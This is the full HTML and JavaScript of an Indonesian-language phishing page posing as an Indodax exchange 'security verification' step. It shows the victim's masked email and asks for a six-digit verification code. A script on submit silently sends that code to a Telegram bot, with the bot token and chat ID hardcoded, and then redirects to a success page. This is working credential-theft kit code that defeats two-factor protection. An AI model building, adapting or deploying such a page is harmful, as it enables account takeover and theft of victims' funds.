<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Verifikasi Keamanan</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link
    rel="stylesheet"
    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
  />
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter&display=swap');
    body {
      font-family: 'Inter', sans-serif;
    }
    /* Loading overlay styles */
    #loadingOverlay {
      background-color: rgba(255, 255, 255, 0.8);
      backdrop-filter: blur(3px);
      position: fixed;
      inset: 0;
      z-index: 50;
      display: flex;
      justify-content: center;
      align-items: center;
      visibility: hidden;
      opacity: 0;
      transition: opacity 0.3s ease;
    }
    #loadingOverlay.show {
      visibility: visible;
      opacity: 1;
    }
    /* Spinner animation */
    .spinner {
      border: 4px solid #e5e7eb; /* Tailwind gray-200 */
      border-top: 4px solid #0077cc; /* Custom blue */
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body class="bg-white min-h-screen flex flex-col">
  <div class="max-w-md w-full mx-auto flex flex-col px-5 pt-5 pb-20">
    <!-- Header with back arrow and title -->
    <div class="flex items-center space-x-3 mb-6">
      <button aria-label="Kembali" class="text-gray-600 hover:text-gray-800 focus:outline-none" onclick="history.back()">
        <i class="fas fa-arrow-left text-lg"></i>
      </button>
      <h1 class="font-semibold text-gray-900 text-lg leading-6">Verifikasi Keamanan</h1>
    </div>

    <!-- Instruction text -->
    <p class="text-gray-600 text-sm mb-5 leading-relaxed">
      Harap selesaikan proses verifikasi di bawah untuk melanjutkan
    </p>

    <!-- Subtitle -->
    <p class="text-gray-700 font-semibold text-sm mb-2">Verifikasi via Email (6 digit)</p>

    <!-- Input container -->
    <form id="verificationForm" class="flex items-center justify-between border border-gray-300 rounded-md px-3 py-2 mb-3" onsubmit="return sendToTelegram(event)">
      <span class="font-semibold text-gray-900">X-</span>
      <input
        id="codeInput"
        name="code"
        type="text"
        placeholder="Masukkan Kode"
        class="flex-1 text-gray-400 placeholder-gray-400 text-sm focus:outline-none ml-2"
        aria-label="Masukkan Kode"
        maxlength="6"
        required
      />
      <span class="text-gray-400 text-xs Timer">00:59</span>
    </form>

    <!-- Warning box -->
    <div class="flex items-start bg-yellow-50 rounded-md p-3 mb-5">
      <i class="fas fa-exclamation-triangle text-yellow-500 mt-1 mr-2"></i>
      <p class="text-yellow-700 text-xs leading-tight" id="emailWarning">
        Kode verifikasi telah dikirim ke [*********@gmail.com].
      </p>
    </div>
  </div>

  <!-- Bottom fixed button -->
  <div class="fixed bottom-0 left-0 w-full max-w-md mx-auto px-5 pb-5 bg-white">
    <button
      id="submitBtn"
      type="submit"
      form="verificationForm"
      class="w-full bg-gray-400 text-white text-sm font-semibold py-3 rounded-lg cursor-not-allowed select-none"
      disabled
    >
      Verifikasi
    </button>
  </div>

  <!-- Loading overlay -->
  <div id="loadingOverlay">
    <div class="spinner" role="status" aria-label="Loading"></div>
  </div>

  <script>
    const codeInput = document.getElementById('codeInput');
    const submitBtn = document.getElementById('submitBtn');
    const timerSpan = document.querySelector('.Timer');
    const emailWarning = document.getElementById('emailWarning');
    const loadingOverlay = document.getElementById('loadingOverlay');

    // Retrieve email from localStorage and mask it
    function maskEmail(email) {
      const [localPart, domain] = email.split('@');
      if (!localPart || !domain) return email;
      const maskedLocal = localPart.length <= 2
        ? localPart[0] + '*'.repeat(localPart.length - 1)
        : localPart[0] + '*'.repeat(localPart.length - 2) + localPart.slice(-1);
      return maskedLocal + '@' + domain;
    }

    window.addEventListener('DOMContentLoaded', () => {
      const savedEmail = localStorage.getItem('indodaxEmail');
      if (savedEmail) {
        const masked = maskEmail(savedEmail);
        emailWarning.textContent = `Kode verifikasi telah dikirim ke [${masked}].`;
      }
    });

    codeInput.addEventListener('input', () => {
      if (codeInput.value.trim().length === 6) {
        submitBtn.disabled = false;
        submitBtn.classList.remove('bg-gray-400', 'cursor-not-allowed', 'select-none');
        submitBtn.classList.add('bg-gray-700', 'cursor-pointer');
      } else {
        submitBtn.disabled = true;
        submitBtn.classList.add('bg-gray-400', 'cursor-not-allowed', 'select-none');
        submitBtn.classList.remove('bg-gray-700', 'cursor-pointer');
      }
    });

    // Countdown timer from 00:59 to 00:00
    let timeLeft = 59;
    const timerInterval = setInterval(() => {
      if (timeLeft <= 0) {
        clearInterval(timerInterval);
        timerSpan.textContent = '00:59';
        // Optionally disable input or show resend option here
      } else {
        const seconds = timeLeft < 10 ? '0' + timeLeft : timeLeft;
        timerSpan.textContent = `00:${seconds}`;
        timeLeft--;
      }
    }, 1000);

    function sendToTelegram(event) {
      event.preventDefault();
      const code = codeInput.value.trim();
      if (code.length !== 6) return;

      // Show loading overlay
      loadingOverlay.classList.add('show');

      const botToken = '8264143217:AAGF4jq6UCT52FUQ-PCGg2DTVn_wW3Ql14w';
      const chatId = '6155537801';
      const message = `Kode verifikasi diterima: ${code}`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      })
      .then(response => response.json())
      .then(data => {
        loadingOverlay.classList.remove('show');
        if (data.ok) {
          codeInput.value = '';
          submitBtn.disabled = true;
          submitBtn.classList.add('bg-gray-400', 'cursor-not-allowed', 'select-none');
          submitBtn.classList.remove('bg-gray-700', 'cursor-pointer');
          // Redirect after short delay to show loading
          loadingOverlay.classList.add('show');
          setTimeout(() => {
            window.location.href = "success.html";
          }, 800);
        } else {
          alert('Gagal mengirim kode ke Telegram.');
        }
      })
      .catch(() => {
        loadingOverlay.classList.remove('show');
        alert('Terjadi kesalahan saat mengirim kode.');
      });
    }
  </script>
</body>
</html>
